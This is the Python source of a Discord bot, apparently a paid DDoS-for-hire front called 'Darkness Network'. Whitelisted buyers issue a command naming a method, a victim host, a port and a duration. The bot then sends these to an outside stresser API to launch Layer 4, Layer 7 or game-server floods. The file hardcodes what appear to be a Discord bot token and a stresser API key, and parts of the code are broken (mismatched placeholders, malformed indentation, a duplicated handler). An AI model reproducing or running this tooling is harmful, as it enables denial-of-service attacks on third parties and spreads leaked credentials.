# =====Import Module=====#

import os
import discord
from discord.ext import commands
from discord.ext.commands import Bot
from os import system
from os import name
from colorama import *
import random
import datetime
import requests
import aiohttp

# =====User && Methods Setting=====#
buyers = [1141615067075461131]  # ID users
admins = [1141615067075461131]  # ID users
owners = [1141615067075461131]  # ID users

l4methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET', 'CLOUDFLARE', 'UDP-BYPASS', 'SLOW']
l7methods = ['TLSv2', 'HTTP-GOV', 'WEB-PROXIE']
gmethods = ['GAME', 'FIVEM', 'FN']

api_data = [
    {
        'api_url':'https://api.nightmarestresser.net/?key=',
        'api_key':'576364-GwGtzpU6GmNt8Jgzf1kU9OAikLrKfTor&method=[METHOD]&host=[HOST]&port=[PORT]&time=[TIME]',
        'max_time':'60'
    }
]

year_now = datetime.datetime.now().strftime("%Y")

#=====INITILIZE====================#
token = 'MTE4NjMyNDQxNTMzNjY5Nzg5Nw.GLLx8W.DKjsMWPwJCzdrz-FySPf6e9fVhKH89u9SfM0aE'  # paste your token here
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.messages = True
intents.dm_messages = True
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")

# =====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol

# =====Bot Command=====#
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Darkness Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}",
                          color=await random_color())
    embed.add_field(name="**Syntax**", value="```md\n.ddos <method> <target> <port> <time>```")
    embed.add_field(name="**HELP**", value="```.hit to view methods```")
    embed.add_field(name="**NOTE**", value="> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Darkness Network.")
    embed.set_footer(text=f"©{year_now} Copyright Of Darkness Network")
    await ctx.send(embed=embed)

@bot.command()
async def add_buyer(ctx, buyer: int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')
    elif buyer is None:
        await ctx.send('Please give a buyer!!')
    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_buyer(ctx, buyer: int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')
    elif buyer is None:
        await ctx.send('Please give a buyer!!')
    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')

@bot.command()
async def add_admin(ctx, admin: int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')
    elif admin is None:
        await ctx.send('Please give an admin!!')
    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_admin(ctx, admin: int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')
    elif admin is None:
        await ctx.send('Please give an admin!!')
    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def hit(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers: # They didn't buy the bot!!
        await ctx.send('Sorry, but you need to buy a spot!')

    else:
        if method is None or method.upper() == 'methods':
            l4methodstr = ''
            l7methodstr = ''
            gmethodstr = ''
            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            for m3 in gmethods:
                gmethodstr = f'{gmethodstr}{m3}\n'
                
            embed = discord.Embed(title="METHOD LIST", description="---------------------------------------------")
            embed.add_field(name="Layer 4:", value=f"{l4methodstr}", inline=False)
            embed.add_field(name="Game Methods:", value=f"{gmethodstr}", inline=True)
            embed.add_field(name="Layer 7:", value=f"{l7methodstr}", inline=False)

            await ctx.send(embed=embed)

        # There was no method
        elif method is None:
            await ctx.send('You need a method!')
            
        # The method was invalid!
        elif method.upper() not in l4methods and method.upper() not in l7methods and method.upper() not in gmethods:
            await ctx.send(f'Invalid method!!')

        # There was no victim
        elif victim is None:
            await ctx.send('You need a target!')

        # There was no port
        elif port is None:
            await ctx.send('You need a port!')

        # There was no time
        elif time is None:
            await ctx.send('You need a time!')

        # Everything is correct!
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time2 = max_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        replace1 = api_key.replace("[host]", victim)
                        replace2 = replace1.replace("[port]", port)
                        replace3 = replace2.replace("[time]", time)
                        replace4 = replace3.replace("[method]", method)
                        await session.get(f'{api_url}{replace4}')
                except Exception as e:
                    embed = discord.Embed(title="Made By Sysk3y", description=f"")
                    await ctx.send(embed=embed)
                    pass

            embed = discord.Embed(title="ATTACK SENT SUCCESSFUL", description=f"")            
            embed2 = discord.Embed(color=0x9b59b6)
            embed.add_field(name="------------------------------------------------", value="", inline=False)
            embed.add_field(name=f"VICTIM: ``{victim}``", value=f"", inline=False)
            embed.add_field(name=f"PORT: ``{port}``", value=f"", inline=False)
            embed.add_field(name=f"TIME: ``{time}``", value=f"", inline=False)
            embed.add_field(name=f"METHOD: ``{method}``", value=f"", inline=False)
            embed.add_field(name="------------------------------------------------", value="", inline=False)
            embed.set_footer(text='- Made By WHT SEC')


@bot.event
async def on_ready():
    banner = f"""⠀⠀⠀⠀
                                              ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                       ⣀ ⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀                         ⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀                         ⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
    ⠀⠀⠀⠀⠀                         ⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
    ⠀⠀⠀                         ⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
    ⠀⠀                         ⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
                             ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
                             ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
                             ⠁⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
    ⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
⠀⠀    ⠀⠀                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁

⠀⠀⠀⠀
+==========================================================================================================+
|                                                                                                          |⠀
|                                                                                                          |
|   ░██████╗░██████╗░██╗███╗░░░███╗  ███╗░░██╗███████╗████████╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░██╗      |
|   ██╔════╝░██╔══██╗██║████╗░████║  ████╗░██║██╔════╝╚══██╔══╝░██║░░██╗░░██║██╔══██╗██╔══██╗██║░██╔╝      |
|   ██║░░██╗░██████╔╝██║██╔████╔██║  ██╔██╗██║█████╗░░░░░██║░░░░╚██╗████╗██╔╝██║░░██║██████╔╝█████═╝░      |
|   ██║░░╚██╗██╔══██╗██║██║╚██╔╝██║  ██║╚████║██╔══╝░░░░░██║░░░░░████╔═████║░██║░░██║██╔══██╗██╔═██╗░      |
|   ╚██████╔╝██║░░██║██║██║░╚═╝░██║  ██║░╚███║███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██║░╚██╗      |⠀
|   ░╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝      |⠀
|                                                                                                          |⠀
+==========================================================================================================+
⠀
                                          Created By: TheDarkness
    """
        if name == 'nt':
        system('cls')
    else:
        system('clear')
    async def on_ready():
    print('╔════════════════════════════════════════╗')
    print('║            Bot Information             ║')
    print('╠════════════════════════════════════════╣')
    print('║             Bot Username:              ║')
    print(f'║            [+] {bot.user.name} [+]             ║')
    print('║                                        ║')
    print('║            Disnake Version:            ║')
    print(f'║             [+] {discord.__version__} [+]              ║')
    print('╚════════════════════════════════════════╝')
    print('')
    
    await bot.change_presence(activity=discord.Game(name="/help"))
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
if __name__ == '__main__':
    bot.run(token)